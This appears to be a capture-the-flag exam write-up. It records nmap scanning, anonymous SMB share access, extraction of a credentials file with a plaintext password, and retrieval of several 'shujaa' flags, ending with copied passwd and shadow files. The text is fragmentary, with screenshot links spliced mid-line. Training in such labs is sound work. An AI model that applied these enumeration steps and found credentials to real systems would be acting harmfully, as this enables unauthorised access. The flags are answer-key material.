# felix-bett
└─$ nmap -sV -Pn 44.202.86.42                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 11:31 EDT              
Nmap scan report for ec2-44-202-86-42.compute-1.amazonaws.com (44.202.86.42) 
Host is up (0.32s latency).                                                  
Not shown: 996 filtered tcp ports (no-response)                              
PORT    STATE SERVICE     VERSION                                            
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)                                                                  
80/tcp  open  http        SimpleHTTPServer 0.6 (Python 3.12.3)               
139/tcp open  netbios-ssn Samba smbd 4                                       
445/tcp open  netbios-ssn Samba smbd 4                                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                      
                                                                             
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                            
Nmap d![Screenshot_2025-06-28_11_32_42](https://github.com/user-attachments/assets/0f51e712-d07e-43c2-bfda-bb7c9fb0846d)
one: 1 IP address (1 host up) scanned in 33.18 seconds 

2   139/tcp open  netbios-ssn Sa![20250315_215537](https://github.com/user-attachments/assets/ab60a871-5014-4c03-8c51-281a45211641)
mba smbd 4
3
llyspirit㉿kali)-[~]
└─$ curl http://44.202.86.42:80/flag/index.html
shujaa{web_flag_8080}

┌──(hollyspirit㉿kali)-[~]
![Screenshot_2025-06-28_11_46_54](https://github.com/user-attachments/assets/5424116d-e58e-4c29-b4f8-7b9941d7a797)

 4 
 445/tcp open  netbios-ssn Samba smbd 4
 




6
 
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      
        midexam         Disk      
        IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 44.202.86.42 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
![Screenshot_2025-06-28_12_02_50](https://github.com/user-attachments/assets/674130a6-0389-470a-bdb7-76d8b5ebbb76)

7 
2
print$          Disk      
        midexam         Disk      
        IPC$            IPC   
8
 smbclient //44.202.86.42/IPC$ -N                                                    
Try "help" to get a list of possible commands.
smb: \> 
![Screenshot_2025-06-28_12_10_04](https://github.com/user-attachments/assets/a706cfd0-605c-4c62-9be6-e9d77db02e78)
9
$ smbclient //44.202.86.42/midexam -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 28 10:42:27 2025
  ..                                  D        0  Sat Jun 28 10:42:27 2025
  examdata                            D        0  Sat Jun 28 10:42:27 2025

                7034376 blocks of size 1024. 3570612 blocks available
smb: \> ls
![Screenshot_2025-06-28_12_12_27](https://github.com/user-attachments/assets/2151f395-41f9-4b82-be40-5b9f7b2ee1af)

10
┌──(hollyspirit㉿kali)-[~]
└─$ unzip project.zip                                                                  
Archive:  project.zip
 extracting: flag.txt                
 extracting: creds.txt               

┌──(hollyspirit㉿kali)-[~]
└─$ cat flag.txt                                                                       
shujaa{file_extract_flag}
![Screenshot_2025-06-28_12_27_00](https://github.com/user-attachments/assets/dc1cf4e9-95a8-4ff7-9b0a-a9fe6f9ab6d8)

11
└─$ cat creds.txt                                                                      
user:malisafi
password:DuncanIsHimL0L
![Screenshot_2025-06-28_12_29_21](https://github.com/user-attachments/assets/d6a66804-4dcf-4048-bf71-c730bc8d0b4f)

12
malisafi@ip-172-31-94-184:~$ cat flag.txt
shujaa{home_directory_flag}
![Screenshot_2025-06-28_12_32_52](https://github.com/user-attachments/assets/59a9d7be-e922-4916-b14a-1ae4fcd479dc)
13
base64file
![Screenshot_2025-06-28_12_35_34](https://github.com/user-attachments/assets/3e5c29b8-73be-440f-9a61-00f59a60ce06)

14
shujaa{decode_th1s_fl4g}
![Screenshot_2025-06-28_12_36_55](https://github.com/user-attachments/assets/02d4b63c-bd04-4934-ae7d-949d26a87f62)

15
malisafi@ip-172-31-94-184:~$ grep -i shujaa grepme.txt
shujaa{gr3p_th3_r1ght_l1n3}
![Screenshot_2025-06-28_12_38_11](https://github.com/user-attachments/assets/0db8d9f2-278c-4d6c-9d1b-8547f65806f9)
16
malisafi@ip-172-31-94-184:~$ ./checkflag examfile.txt
shujaa{vim_trigger_master}
![Screenshot_2025-06-28_12_40_00](https://github.com/user-attachments/assets/7bfbab72-51e7-41bb-8c2f-481cfe23cc7d)
17
./checkifcompressed examfile.zip
![Screenshot_2025-06-28_12_43_02](https://github.com/user-attachments/assets/63e716ac-bf47-4cb0-85af-5e563cc42f16)
18
-rw-rw-r-- 1 malisafi malisafi 1946 Jun 28 16:32 passwd
-rw-rw-r-- 1 malisafi malisafi 1124 Jun 28 16:17 shadow
![Screenshot_2025-06-28_12_44_36](https://github.com/user-attachments/assets/ade13a10-9818-4d1a-bab0-5fa9f4cdb1b3)
19

